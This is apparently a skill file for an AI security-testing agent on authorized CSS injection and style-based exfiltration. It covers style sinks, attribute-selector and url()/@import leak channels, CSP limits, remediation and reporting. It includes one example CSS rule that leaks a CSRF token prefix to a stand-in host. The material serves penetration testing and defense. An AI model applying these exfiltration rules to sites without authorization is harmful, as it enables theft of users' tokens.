---
name: css-injection-exfiltration
description: >
  Authorized CSS injection and style-based data exfiltration awareness: map
  untrusted input into style contexts, assess attribute-selector and
  url()/@import channels, and document impact under CSP style-src without
  treating CSS as full script XSS. Use when user-controlled CSS, style
  attributes, theme/customization fields, or reflected values in selectors
  may leak secrets via browser style loading on owned or in-scope apps.
---

# CSS Injection / Exfiltration (Authorized Awareness)

## When To Use

- Untrusted input reaches `<style>`, `style="..."`, CSS files, themes, or rich-text style allowlists.
- Engagement asks about CSS injection, style-based exfil, attribute selectors, or “XSS without script.”
- CSP blocks scripts but `style-src` is loose; need residual CSS impact after XSS triage.
- Profile, note, or email HTML allows style tags/properties but not scripts.
- Not primary for script/HTML event-handler XSS — use `xss-cross-site-scripting`. Not primary for full CSP script bypass — use `content-security-policy-bypass`.

## Scope And Authorization

- Authorized apps, staging, labs, CTFs, and explicitly in-scope production only.
- Prefer self-account or test-account secrets (CSRF tokens in forms you own, demo flags). Do not exfiltrate other users’ production data.
- Host style-triggered callbacks only on **approved** collaborator/exploit hosts or local listeners under program rules — no drive-by third-party victims.
- CSS exfil is often **slow, noisy, and partial** (character-class / sequential probes). Report realistic constraints; do not overclaim full session theft without evidence.
- Redact tokens, cookies, PII, and collaborator URLs tied to live sessions in reports.
- “Injection” means attacker-influenced CSS syntax or values in a page the victim browser loads — prove reflection/storage path first.

## Workflow

### 1. Confirm a style sink

| Sink | What to check |
| --- | --- |
| Inline `style="..."` | Breakout from property value (`"; ...` / quote issues) |
| `<style>` block | Full rule injection; `@import`, `@font-face`, selectors |
| Linked stylesheet URL | Attacker-controlled `href` or path to CSS |
| Theme / “custom CSS” / SVG style | Intended or embedded CSS; often still allows `url()` and selectors |
| Sanitizer allowlist | Style tags kept; dangerous properties or `url()` not stripped |

Insert a unique canary property first (e.g. `x-css-canary: 1` or harmless color) to prove the context, then classify quote/brace boundaries.

### 2. Separate “nuisance CSS” from “exfil channel”

1. **Nuisance / UI abuse:** hide elements, overlay, phishing-adjacent layout — note UX/phishing risk only if in program scope.
2. **Data-bearing exfil:** rules that cause the browser to **request** attacker-controlled URLs when a secret value matches a selector or is embedded in a `url()`.
3. **Script escalation:** if you can break into HTML/JS (close `</style>`, inject tags), hand off to `xss-cross-site-scripting` — that is no longer pure CSS.

### 3. Classic exfil patterns (lab-style awareness)

Document which patterns apply to the **actual** DOM you control:

1. **Attribute selectors** — probe attributes present in the victim page (e.g. CSRF token, `value` on inputs, `data-*`, meta content) character-by-character or by prefix:

   ```css
   input[name="csrf"][value^="a"] {
     background: url("https://oast.example/c?p=a");
   }
   ```

   Scale with charset batches; note request volume and detection risk.

2. **`url()` in properties** — `background`, `list-style-image`, `cursor`, `border-image`, `@font-face src` may trigger fetches when the rule applies.
3. **`@import url(...)`** — early load of attacker CSS; combine with further rules once imported sheet applies.
4. **Combinators / `:has()` (where supported)** — condition requests on DOM structure (e.g. presence of privileged UI). Record browser support for the PoC environment.
5. **Value reflection into `url()`** — if a secret is concatenated into a CSS `url(...)` without encoding, a single request may leak it (higher impact than pure prefix oracles).

Always close the loop: **victim page loads attacker CSS** + **secret is in a matchable DOM/CSS context** + **outbound request observed** on the approved listener.

### 4. Preconditions and limits

| Factor | Effect on exploitability |
| --- | --- |
| Secret not in DOM / attributes | Attribute-selector exfil fails |
| HttpOnly session cookie | Not readable via CSS; other in-DOM tokens still may leak |
| CSP `style-src` (no unsafe-inline / hashes) | Inline or injected rules may not apply |
| CSP `img-src` / `font-src` / `default-src` | May block exfil destinations even if CSS injects |
| Caching / prefetch of probe URLs | False positives; use unique paths per probe |
| Sanitizer strips `url(` / `@import` | Residual risk depends on remaining properties |

Do not claim universal cross-browser success; record browser and version.

### 5. CSP and companion controls

1. Collect `Content-Security-Policy` (and report-only) on the document that hosts the style sink.
2. Focus on `style-src` / `style-src-elem` / `style-src-attr`, plus resource directives that gate `url()` loads (`img-src`, `font-src`, `default-src`).
3. If script execution under CSP is the real goal, route to `content-security-policy-bypass` with any HTML/JS sink findings.
4. Strict CSP that still allows attacker styles on an allowed origin is a **style** finding, not a script bypass.

### 6. Proof standard and remediation

**Proof**

- Minimal stylesheet or style attribute that triggers **one** clear collaborator hit tied to a known test secret prefix or value.
- Request/response showing how CSS entered the page (reflected param, stored theme, etc.).
- Browser console/network evidence; note failed probes blocked by CSP.

**Remediation (implementation with `code-quality-standards`)**

- Prefer structured theme tokens over free-form CSS; if rich CSS is required, sanitize with a maintained parser/allowlist and ban `@import` / open `url()`.
- Context-encode reflections into `style` attributes and `<style>` blocks; keep secrets out of matchable DOM attributes when possible.
- CSP: tighten `style-src` (nonces/hashes where feasible), avoid broad style `'unsafe-inline'`; constrain `img-src` / `font-src` on untrusted pages.
- Retest original PoC; add regression tests for sanitizer/encoder helpers.

## Routing

| Need | Skill |
| --- | --- |
| HTML/JS/event-handler XSS, script sinks | `xss-cross-site-scripting` |
| CSP parse, script-src bypass, nonce/hash loaders | `content-security-policy-bypass` |
| Sanitizer, encoder, CSP headers, theme API fixes | `code-quality-standards` |
| Pure CSS injection / style exfil (this skill) | **`css-injection-exfiltration`** |

Route **to** `xss-cross-site-scripting` when style context breaks into markup/script. Route **to** `content-security-policy-bypass` for script execution under CSP or policy hardening beyond `style-src`. Always apply **`code-quality-standards`** for remediation and defensive code review.

## Output Checklist

- [ ] Authorization and approved collaborator/OAST host recorded
- [ ] Style sink and entry path (reflected / stored / theme / attribute)
- [ ] Canary proof that attacker CSS or style values apply
- [ ] Exfil mechanism: attribute selector, `url()`, `@import`, value-in-url, other
- [ ] Secret class targeted (CSRF, token, flag) and whether it is in the DOM
- [ ] Network evidence of leak (unique path); browser/version
- [ ] CSP style/resource directives and whether they blocked or allowed the channel
- [ ] Limits: charset/time, partial oracle, sanitizer residue
- [ ] Escalation to XSS/CSP skills if applicable — or explicit “CSS-only”
- [ ] Remediation and retest status; redacted evidence paths

## Rules

- Authorized targets only; no production multi-tenant secret theft.
- Do not equate CSS injection with script XSS severity without demonstrated data or boundary impact.
- Prefer minimal proofs over full charset blasts; label self-only custom-CSS impact honestly.
- Cite observed CSP and browser behavior; redact secrets and collaborator IDs.
